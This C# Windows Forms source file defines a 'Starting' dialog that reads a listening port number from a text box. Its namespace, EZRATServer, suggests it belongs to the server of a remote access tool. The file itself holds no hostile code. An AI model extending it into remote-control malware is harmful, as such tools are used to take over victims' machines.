using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EZRATServer.Forms
{
    public partial class Starting : Form
    {
        int _port = 0;
        public Starting()
        {
            InitializeComponent();
            this.btnOK.Click += BtnOK;
            this.tbxPort.KeyPress += DetectEnter;
        }

        public int Port { get => _port; set => _port = value; }

        private void BtnOK(object sender,EventArgs  e)
        {
            this.Port = Convert.ToInt32(this.tbxPort.Text);
            this.Close();
        }
        private void DetectEnter(object sender,KeyPressEventArgs key)
        {
            if ((Keys)key.KeyChar == Keys.Enter)
            {
                this.btnOK.PerformClick();
            }
        }
    }
}
